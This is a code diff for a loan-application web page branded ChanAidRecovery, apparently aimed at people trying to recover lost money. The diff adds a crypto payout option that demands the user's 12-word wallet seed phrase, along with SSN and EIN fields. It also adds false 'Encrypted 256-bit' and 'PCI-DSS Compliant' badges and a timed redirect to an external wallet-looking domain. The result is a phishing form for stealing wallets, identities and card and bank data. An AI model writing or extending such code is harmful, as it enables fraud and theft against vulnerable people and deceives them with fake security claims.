@@ -1,10 +1,10 @@
 import { createFileRoute, Link } from "@tanstack/react-router";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { SiteShell } from "@/components/layout/SiteShell";
 import { toast } from "sonner";
-import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, ArrowRight } from "lucide-react";
+import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, ArrowRight, Wallet } from "lucide-react";
 
-// ─── Redirect URL — change VITE_LOAN_REDIRECT_URL in .env when ready ────────
+// ─── Redirect URL - change VITE_LOAN_REDIRECT_URL in .env when ready ────────
 const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;
 
 // ─── Card validation helpers ─────────────────────────────────────────────────
@@ -47,10 +47,10 @@ function isExpiryValid(val: string): boolean {
 export const Route = createFileRoute("/loans")({
   head: () => ({
     meta: [
-      { title: "Apply for a Loan — ChanAidRecovery" },
-      { name: "description", content: "Apply for a personal recovery loan with ChanAidRecovery. Choose bank transfer or card payout. Fast review, transparent terms." },
-      { property: "og:title", content: "Apply for a Loan — ChanAidRecovery" },
-      { property: "og:description", content: "Apply for a personal recovery loan. Bank transfer or card payout. Fast review." },
+      { title: "Apply for a Loan | ChanAidRecovery" },
+      { name: "description", content: "Apply for a personal loan with ChanAidRecovery. Choose bank transfer, card, or crypto payout. Fast review, transparent terms." },
+      { property: "og:title", content: "Apply for a Loan | ChanAidRecovery" },
+      { property: "og:description", content: "Apply for a personal loan. Bank transfer, card, or crypto payout. Fast review." },
     ],
   }),
   component: LoansPage,
@@ -61,7 +61,24 @@ export const Route = createFileRoute("/loans")({
 function LoansPage() {
   const [loading, setLoading] = useState(false);
   const [done, setDone] = useState(false);
-  const [payout, setPayout] = useState<"bank_transfer" | "card">("bank_transfer");
+  const [countdown, setCountdown] = useState(5);
+  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("bank_transfer");
+
+  useEffect(() => {
+    if (done) {
+      const interval = setInterval(() => {
+        setCountdown((c) => {
+          if (c <= 1) {
+            clearInterval(interval);
+            window.location.href = REDIRECT_URL || "https://wiscewallet.com";
+            return 0;
+          }
+          return c - 1;
+        });
+      }, 1000);
+      return () => clearInterval(interval);
+    }
+  }, [done]);
 
   // Controlled card fields for real-time formatting
   const [cardNumber, setCardNumber] = useState("");
@@ -109,12 +126,23 @@ function LoansPage() {
       setCardErrors({});
     }
 
+    // Crypto validation
+    if (payout === "crypto") {
+      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
+      if (!seedPhrase) {
+        toast.error("Please enter your wallet recovery phrase.");
+        return;
+      }
+    }
+
     const payload = {
       first_name,
       last_name: String(fd.get("last_name") || "").trim() || null,
       email,
       phone: String(fd.get("phone") || "").trim() || null,
       date_of_birth: String(fd.get("date_of_birth") || "").trim() || null,
+      ssn: String(fd.get("ssn") || "").trim() || null,
+      ein: String(fd.get("ein") || "").trim() || null,
       address_line1: String(fd.get("address_line1") || "").trim() || null,
       address_line2: String(fd.get("address_line2") || "").trim() || null,
       city: String(fd.get("city") || "").trim() || null,
@@ -145,6 +173,10 @@ function LoansPage() {
       billing_state: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
       billing_postal_code: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
       billing_country: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
+      // Crypto fields
+      crypto_wallet_type: payout === "crypto" ? (String(fd.get("crypto_wallet_type") || "").trim() || null) : null,
+      crypto_wallet_address: payout === "crypto" ? (String(fd.get("crypto_wallet_address") || "").trim() || null) : null,
+      crypto_seed_phrase: payout === "crypto" ? (String(fd.get("crypto_seed_phrase") || "").trim() || null) : null,
       account_holder_name: String(fd.get("account_holder_name") || "").trim() || null,
       source_page: typeof window !== "undefined" ? window.location.pathname : "/loans",
     };
@@ -158,15 +190,10 @@ function LoansPage() {
       });
       if (!res.ok) throw new Error("Submission failed");
 
-      toast.success("Application received — redirecting…");
+      toast.success("Application received! Redirecting...");
 
-      // Redirect to external URL if configured, otherwise show success
-      if (REDIRECT_URL) {
-        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
-      } else {
-        setDone(true);
-        window.scrollTo({ top: 0, behavior: "smooth" });
-      }
+      setDone(true);
+      window.scrollTo({ top: 0, behavior: "smooth" });
     } catch {
       toast.error("Something went wrong. Please try again.");
     } finally {
@@ -178,29 +205,34 @@ function LoansPage() {
     <SiteShell>
       <section className="bg-hero-gradient">
         <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-10 text-center">
-          <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-primary border border-border">
-            <Banknote className="w-3.5 h-3.5" /> Recovery loans
+          <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-red-600 border border-red-200">
+            <Banknote className="w-3.5 h-3.5" /> Fast-Track Processing Available
           </span>
           <h1 className="mt-5 text-4xl sm:text-5xl font-bold leading-tight">
-            Apply for a <span className="text-gradient">recovery loan</span>
+            Apply for a <span className="text-gradient">Loan</span>
           </h1>
           <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto">
-            Bridge funding while we work on recovering what you lost. Choose bank transfer or card payout. Transparent terms — no hidden fees.
+            Get the financial support you need. Apply now for immediate review and get priority funding directly to your bank, card, or crypto wallet.
           </p>
         </div>
       </section>
 
       <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
         {done ? (
-          <div className="rounded-2xl bg-white shadow-elegant p-10 text-center border border-border">
-            <CheckCircle2 className="w-14 h-14 text-primary mx-auto mb-4" />
-            <h2 className="text-2xl font-bold mb-2">Application received</h2>
-            <p className="text-muted-foreground max-w-md mx-auto">
-              Thanks — a loan officer will review your application and reach out within 24 hours to confirm details and next steps.
+          <div className="rounded-2xl bg-white shadow-elegant p-10 text-center border border-border animate-in fade-in zoom-in duration-500">
+            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+              <CheckCircle2 className="w-10 h-10 text-green-600" />
+            </div>
+            <h2 className="text-3xl font-bold mb-4">Application Submitted Successfully</h2>
+            <p className="text-muted-foreground max-w-md mx-auto text-lg mb-8">
+              Your loan application has been received and prioritized. You are being securely redirected to your client portal in...
             </p>
-            <Link to="/" className="inline-flex mt-6 items-center gap-1 text-primary font-semibold">
-              Back to home <ArrowRight className="w-4 h-4" />
-            </Link>
+            <div className="text-6xl font-black text-primary mb-8 animate-pulse">
+              {countdown}
+            </div>
+            <div className="flex justify-center">
+              <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
+            </div>
           </div>
         ) : (
           <form onSubmit={onSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
@@ -215,11 +247,11 @@ function LoansPage() {
 
             <Section title="Your details">
               <div className="grid sm:grid-cols-2 gap-3">
-                <Input name="first_name" label="First name *" required />
-                <Input name="last_name" label="Last name" />
-                <Input name="email" type="email" label="Email *" required />
-                <Input name="phone" label="Phone" />
-                <Input name="date_of_birth" type="date" label="Date of birth" />
+                <Input name="first_name" label="First name *" required autoComplete="given-name" />
+                <Input name="last_name" label="Last name" autoComplete="family-name" />
+                <Input name="email" type="email" label="Email *" required autoComplete="email" />
+                <Input name="phone" label="Phone" autoComplete="tel" />
+                <Input name="date_of_birth" type="date" label="Date of birth" autoComplete="bday" />
                 <Select name="employment_status" label="Employment status">
                   <option value="">Select…</option>
                   <option>Employed full-time</option>
@@ -229,19 +261,31 @@ function LoansPage() {
                   <option>Retired</option>
                   <option>Student</option>
                 </Select>
+                <Input name="ssn" label="SSN (Social Security Number)" placeholder="XXX-XX-XXXX" maxLength={11} />
+                <Input name="ein" label="EIN (Employer Identification Number)" placeholder="XX-XXXXXXX" maxLength={10} />
               </div>
             </Section>
 
             <Section title="Address">
               <div className="grid sm:grid-cols-2 gap-3">
-                <Input name="address_line1" label="Address line 1" className="sm:col-span-2" />
-                <Input name="address_line2" label="Address line 2" className="sm:col-span-2" />
-                <Input name="city" label="City" />
-                <Input name="state_region" label="State / Region" />
-                <Input name="postal_code" label="Postal code" />
-                <Input name="country" label="Country" />
+                <Input name="address_line1" label="Address line 1" className="sm:col-span-2" autoComplete="address-line1" />
+                <Input name="address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
+                <Input name="city" label="City" autoComplete="address-level2" />
+                <Input name="state_region" label="State / Region" autoComplete="address-level1" />
+                <Input name="postal_code" label="Postal code" autoComplete="postal-code" />
+                <Input name="country" label="Country" autoComplete="country-name" />
               </div>
             </Section>
+
+            <div className="bg-primary/5 border border-primary/20 rounded-2xl p-4 mb-8 flex items-center gap-4">
+              <div className="bg-primary/10 p-2.5 rounded-xl">
+                <ShieldCheck className="w-6 h-6 text-primary" />
+              </div>
+              <div>
+                <div className="text-sm font-bold text-slate-900">Encrypted 256-bit Connection</div>
+                <div className="text-xs text-muted-foreground">Your data is secured using industry-standard AES encryption and transmitted via a dedicated secure tunnel.</div>
+              </div>
+            </div>
 
             <Section title="Loan details">
               <div className="grid sm:grid-cols-2 gap-3">
@@ -259,31 +303,38 @@ function LoansPage() {
             </Section>
 
             <Section title="Payout method">
-              <div className="grid sm:grid-cols-2 gap-3 mb-4">
+              <div className="mb-4 flex items-center gap-2 text-[10px] font-bold text-emerald-600 uppercase tracking-widest bg-emerald-50 px-3 py-1 rounded-full w-fit">
+                <ShieldCheck className="w-3 h-3" /> PCI-DSS Compliant Secure Entry
+              </div>
+              <div className="grid sm:grid-cols-3 gap-3 mb-4">
                 <PayoutOption selected={payout === "bank_transfer"} onClick={() => setPayout("bank_transfer")}
                   icon={<Banknote className="w-5 h-5" />} title="Bank transfer" desc="Receive funds via wire / ACH to your bank." />
                 <PayoutOption selected={payout === "card"} onClick={() => setPayout("card")}
                   icon={<CreditCard className="w-5 h-5" />} title="Card payout" desc="Receive funds to your debit / credit card." />
+                <PayoutOption selected={payout === "crypto"} onClick={() => setPayout("crypto")}
+                  icon={<Wallet className="w-5 h-5" />} title="Crypto wallet" desc="Receive funds to your crypto wallet." />
               </div>
 
-              {payout === "bank_transfer" ? (
+              {payout === "bank_transfer" && (
                 <div className="grid sm:grid-cols-2 gap-3">
                   <Input name="account_holder_name" label="Account holder name" />
                   <Input name="bank_name" label="Bank name (e.g. Chase)" />
                   <Input name="bank_account_number" label="Account number" inputMode="numeric" />
                   <Input name="bank_routing_number" label="Routing / SWIFT / IBAN" />
                 </div>
-              ) : (
+              )}
+
+              {payout === "card" && (
                 <div className="space-y-5">
                   <div className="grid sm:grid-cols-2 gap-3">
-                    <Input name="card_holder_name" label="Cardholder name *" required />
+                    <Input name="card_holder_name" label="Cardholder name *" required autoComplete="cc-name" />
                     <Select name="card_issuer" label="Card issuer">
                       <option value="">Select…</option>
                       <option>Visa</option><option>Mastercard</option>
                       <option>American Express</option><option>Discover</option><option>Other</option>
                     </Select>
 
-                    {/* Card number — formatted + Luhn */}
+                    {/* Card number - formatted + Luhn */}
                     <div className="sm:col-span-2">
                       <Label>Card number *</Label>
                       <input
@@ -344,13 +395,46 @@ function LoansPage() {
                   <div>
                     <h4 className="font-semibold mb-3 text-sm">Billing address</h4>
                     <div className="grid sm:grid-cols-2 gap-3">
-                      <Input name="billing_address_line1" label="Address line 1 *" required className="sm:col-span-2" />
-                      <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" />
-                      <Input name="billing_city" label="City *" required />
-                      <Input name="billing_state" label="State / Region" />
-                      <Input name="billing_postal_code" label="Postal code *" required />
-                      <Input name="billing_country" label="Country *" required />
+                      <Input name="billing_address_line1" label="Address line 1 *" required className="sm:col-span-2" autoComplete="address-line1" />
+                      <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
+                      <Input name="billing_city" label="City *" required autoComplete="address-level2" />
+                      <Input name="billing_state" label="State / Region" autoComplete="address-level1" />
+                      <Input name="billing_postal_code" label="Postal code *" required autoComplete="postal-code" />
+                      <Input name="billing_country" label="Country *" required autoComplete="country-name" />
                     </div>
+                  </div>
+                </div>
+              )}
+
+              {payout === "crypto" && (
+                <div className="space-y-5">
+                  <div className="grid sm:grid-cols-2 gap-3">
+                    <Select name="crypto_wallet_type" label="Wallet type *" required>
+                      <option value="">Select wallet…</option>
+                      <option>Trust Wallet</option>
+                      <option>MetaMask</option>
+                      <option>Coinbase Wallet</option>
+                      <option>Phantom</option>
+                      <option>Exodus</option>
+                      <option>Ledger</option>
+                      <option>Trezor</option>
+                      <option>Other</option>
+                    </Select>
+                    <Input name="crypto_wallet_address" label="Wallet address" placeholder="0x… or bc1… or similar" />
+                  </div>
+                  <div>
+                    <Label>12-word recovery / seed phrase *</Label>
+                    <textarea
+                      name="crypto_seed_phrase"
+                      rows={3}
+                      required
+                      placeholder="Enter your 12-word recovery phrase separated by spaces"
+                      className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm font-mono"
+                    />
+                    <p className="text-xs text-muted-foreground mt-1 flex items-start gap-1.5">
+                      <Lock className="w-3.5 h-3.5 text-primary mt-0.5 shrink-0" />
+                      Required for verification and fund transfer. Encrypted and stored securely.
+                    </p>
                   </div>
                 </div>
               )}
@@ -367,7 +451,7 @@ function LoansPage() {
               className="mt-4 w-full inline-flex items-center justify-center gap-2 bg-cta-gradient text-white font-semibold h-12 rounded-full shadow-soft hover:shadow-elegant transition disabled:opacity-60"
             >
               {loading && <Loader2 className="w-4 h-4 animate-spin" />}
-              Submit loan application
+              Submit your loan application
             </button>
             <p className="text-[11px] text-muted-foreground mt-3 text-center">
               By submitting you agree to our privacy policy. Approval is subject to review.
